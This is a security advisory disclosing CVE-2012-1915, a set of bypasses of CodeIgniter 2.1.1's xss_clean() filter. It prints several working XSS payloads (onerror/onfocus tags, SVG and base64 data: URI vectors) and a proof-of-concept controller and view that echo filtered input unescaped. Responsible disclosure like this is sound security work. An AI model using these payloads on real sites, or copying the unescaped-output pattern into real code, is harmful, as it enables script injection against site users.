@@ -1,0 +1,135 @@
+id: 10886
+date: 07/23/2012
+title: CodeIgniter 2.1.1 Cross Site Scripting Vulnerability
+author: Krzysztof Kotowicz
+cves: 
+
+This is a security advisory for popular PHP framework - CodeIgniter.
+I've found several bypasses in xss sanitization functions in the
+framework. These were responsibly disclosed to the vendor and are now
+fixed in version 2.1.2. (CVE-2012-1915).
+
+Affected products
+==============
+
+CodeIgniter <= 2.1.1 PHP framework and all CodeIgniter-based PHP
+applications using its built-in XSS filtering mechanism.
+
+CVE
+====
+
+CVE-2012-1915
+
+Introduction
+==========
+
+CodeIgniter ( http://codeigniter.com) is a powerful PHP framework with
+a very small footprint, built for PHP coders who need a simple and
+elegant toolkit to create full-featured web applications. CodeIgniter
+comes with a Cross Site Scripting Hack prevention filter which can
+either run automatically to filter all POST and COOKIE data that is
+encountered, or you can run it on a per item basis. Several vectors
+bypassing claimed XSS filter protections have been found in 2.1.0
+version of the framework. In cooperation with vendor, these have been
+fixed in version 2.1.2.
+
+Description
+=========
+
+XSS filter of CodeIgniter framework is implemented in xss_clean()
+function defined in system/core/Security.php file. It uses multiple,
+mostly blacklist-oriented methods to detect and remove XSS payloads
+from the passed input. As per documentation of the filter (
+http://codeigniter.com/user_guide/libraries/security.html ) the filter
+is supposed to be run on input passed to the application e.g. before
+saving data in the database i.e. it's not an output-escaping, but
+input sanitizing filter.
+
+
+There are multiple ways to bypass the current version of the filters,
+exemplary vectors are given below:
+
+// Different attribute separators and invalid regexp detecting tag
+closure too early
+
+<img/src=">" onerror=alert(1)>
+<button/a=">" autofocus onfocus=alert(1(></button>
+<button a=">" autofocus onfocus=alert(1(>
+
+// Opera 11 svg bypass
+
+<svg xmlns="http://www.w3.org/2000/svg"
+xmlns:xlink="http://www.w3.org/1999/xlink"><feImage> <set
+attributeName="xlink:href"
+to="data:image/svg+xml;charset=utf-8;base64,
+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
+</feImage> </svg>
+
+// data: URI with base64 encoding bypass exploiting Firefox
+origin-inheritance for data:uris
+
+<a target="_blank"
+href="data:text/html;BASE64youdummy,PHNjcmlwdD5hbGVydCh3aW5kb3cub3BlbmVyLmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUwpPC9zY3JpcHQ+">clickme
+in firefox</a>
+<a/''' target="_blank"
+href=data:text/html;;base64,PHNjcmlwdD5hbGVydChvcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpPC9zY3JpcHQ+>firefox11</a>
+
+These exemplary bypasses may be used to cause both reflected and
+stored XSS attacks depending on the way the application built with
+CodeIgniter uses the input filtering mechanism.
+
+Proof of concept
+=============
+
+Build an application on CodeIgniter 2.1.0:
+
+// application/controllers/xssdemo.php
+<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
+
+class Xssdemo extends CI_Controller {
+
+        public function index() {
+            $data['xss'] =
+$this->security->xss_clean($this->input->post('xss'));
+            $this->load->view('xssdemo', $data);
+        }
+}
+
+// application/views/xssdemo.php
+<form method=post>
+                <textarea name=xss><?php echo htmlspecialchars($xss);
+?></textarea>
+                <input type=submit />
+                </form>
+        <p>XSS:
+        <hr />
+    <?php echo $xss ?>
+
+Launch http://app-uri/index.php/xssdemo and try above vectors.
+
+Mitigation
+========
+
+Upgrade to CodeIgniter >= 2.1.2. Avoid using xss-clean() function.
+It's based on multiple blacklists and will therefore unavoidably be
+bypassable in the future. For input filtering, use HTMLPurifier (
+http://htmlpurifier.org/ ) instead.
+
+Credits
+======
+
+Vulnerability found by Krzysztof Kotowicz <kkotowicz at gmail dot com>
+http://blog.kotowicz.net
+
+Timeline
+=======
+
+2012.03.30 - Notified vendor
+2012.04.02 - Vendor response
+2012.04.03 - 2012.04.10 - Fixes coordinated with vendor
+2012.06.29 - v 2.1.2 released with fixes included
+2012.07.19 - Public disclosure
+
+
+
+#  0day.today [2023-03-21]  #
